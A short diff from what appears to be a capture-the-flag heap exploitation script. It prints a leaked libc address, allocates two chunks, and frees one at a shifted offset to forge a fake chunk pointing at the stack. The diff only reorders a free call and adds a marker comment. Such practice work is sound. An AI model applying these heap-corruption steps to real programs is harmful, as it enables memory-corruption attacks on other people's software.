@@ -91,8 +91,10 @@ print(f"Libc Addr: {hex(libc_addr)}")
 
 equipment_addr = add_equipment()
 equipment_addr2 = add_equipment() #free list must contain 2 items if we want to be able to use fake chunk and the forged address for the next chunk on the stack
-call_free(equipment_addr2)
 
+# !!!!!!!!!!!!!!!!!!!!!! ^^^^^^^^^^^^^^^^^^^^ !!!!!!!!!!!!!!!!!!!
+
+call_free(equipment_addr2)
 call_free(equipment_addr + 0x10)
 
 #update(equipment_addr, b"A"*24) # so we can see the protected pointer left by our free call
